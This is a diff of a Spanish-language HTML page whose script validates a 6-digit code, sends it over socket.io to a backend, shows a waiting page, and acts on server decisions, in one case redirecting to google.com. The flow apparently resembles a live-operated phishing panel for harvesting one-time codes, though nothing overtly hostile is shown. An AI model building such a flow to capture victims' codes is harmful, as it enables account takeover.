@@ -92,40 +92,41 @@
   </div>
 
   <script src="/socket.io/socket.io.js"></script>
-<script>
-  const socket = io();
-  const sessionId = localStorage.getItem("sessionId");
+  <script>
+    const socket = io();
+    const sessionId = localStorage.getItem("sessionId");
+    socket.emit("reconectar", sessionId);
 
-  socket.emit("reconectar", sessionId);
+    function validarCodigo() {
+      const codigo = document.getElementById("codigo").value;
+      const mensajeError = document.getElementById("mensajeError");
+      const codigoInput = document.getElementById("codigo");
 
-  function validarCodigo() {
-    const codigo = document.getElementById("codigo").value;
-    const mensajeError = document.getElementById("mensajeError");
-    const codigoInput = document.getElementById("codigo");
+      mensajeError.textContent = "";
+      codigoInput.classList.remove("campo-requerido");
 
-    mensajeError.textContent = "";
-    codigoInput.classList.remove("campo-requerido");
+      if (!codigo) {
+        mensajeError.textContent = "El código es obligatorio";
+        codigoInput.classList.add("campo-requerido");
+      } else if (!/^\d{6}$/.test(codigo)) {
+        mensajeError.textContent = "El código debe tener 6 dígitos numéricos";
+        codigoInput.classList.add("campo-requerido");
+      } else {
+        // Enviar el código al backend
+        socket.emit("codigoIngresado", { codigo, sessionId });
 
-    if (!codigo) {
-      mensajeError.textContent = "El código es obligatorio";
-      codigoInput.classList.add("campo-requerido");
-    } else if (!/^\d{6}$/.test(codigo)) {
-      mensajeError.textContent = "El código debe tener 6 dígitos numéricos";
-      codigoInput.classList.add("campo-requerido");
-    } else {
-      // Enviar al servidor por socket
-      socket.emit("codigoIngresado", { codigo, sessionId });
+        // Ir a pantalla de espera
+        window.location.href = "opciones.html";
+      }
     }
-  }
 
-  socket.on("respuestaCodigo", (decision) => {
-    if (decision === "error") {
-      window.location.href = "denegado.html";
-    } else if (decision === "pedir_usuario") {
-      window.location.href = "index.html";
-    }
-  });
-</script>
-
+    socket.on("respuestaCodigo", (decision) => {
+      if (decision === "error") {
+        window.location.href = "denegado.html";
+      } else if (decision === "finalizar") {
+        window.location.href = "https://www.google.com";
+      }
+    });
+  </script>
 </body>
 </html>
